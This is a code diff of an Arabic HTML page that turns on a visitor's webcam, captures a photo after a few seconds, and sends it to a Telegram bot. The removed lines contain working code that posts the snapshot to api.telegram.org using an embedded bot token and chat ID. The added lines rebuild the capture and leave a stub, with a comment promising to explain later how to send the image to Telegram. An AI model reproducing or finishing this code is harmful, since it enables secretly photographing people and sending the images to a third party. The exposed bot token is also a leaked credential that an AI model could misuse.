@@ -1,71 +1,45 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>📸 جاري التقاط صورة</title>
-  <style>
-    body {
-      text-align: center;
-      font-family: Arial;
-      background-color: #111;
-      color: white;
-    }
-    #status {
-      font-size: 24px;
-      margin-top: 50px;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <title>التقاط صورة وإرسالها</title>
 </head>
 <body>
-  <div id="status">📸 جاري تشغيل الكاميرا... انتظر لحظة</div>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const statusText = document.getElementById('status');
-    const context = canvas.getContext('2d');
+    const ctx = canvas.getContext('2d');
 
-    // Telegram Config
-    const TELEGRAM_TOKEN = "7574165058:AAH61Mxon9qyqiS5trGD0demFckXLIvRlxc";
-    const CHAT_ID = "5683062529";
-
+    // تشغيل الكاميرا
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
+      .then(stream => {
         video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            captureAndSend();
-          }, 3000); // بعد 3 ثواني
-        };
+
+        // بعد 2 ثانية، ناخد صورة
+        setTimeout(() => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // نحول الصورة لـ base64
+          const imageData = canvas.toDataURL('image/png');
+
+          console.log('تم التقاط الصورة:', imageData);
+
+          // هنا تقدر تبعت imageData لـ سيرفر أو بوت تلجرام
+          sendImageToTelegram(imageData);
+
+        }, 2000);
       })
-      .catch((error) => {
-        statusText.innerText = "❌ لم يتم الوصول للكاميرا";
-        console.error("Camera error:", error);
+      .catch(err => {
+        alert('حدث خطأ في تشغيل الكاميرا: ' + err);
       });
 
-    function captureAndSend() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob((blob) => {
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "photo.jpg");
-
-        fetch(https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto, {
-          method: "POST",
-          body: formData
-        })
-        .then(response => {
-          statusText.innerText = "✅ تم إرسال الصورة بنجاح!";
-        })
-        .catch(error => {
-          statusText.innerText = "❌ فشل في إرسال الصورة!";
-          console.error("Telegram error:", error);
-        });
-      }, 'image/jpeg');
+    // دالة لإرسال الصورة (مثال مبدئي)
+    function sendImageToTelegram(base64Image) {
+      // هنشرحلك بعد شوية إزاي تبعت الصورة فعليًا لبوت تلجرام
+      console.log('ارسل الصورة لTelegram هنا');
     }
   </script>
 </body>
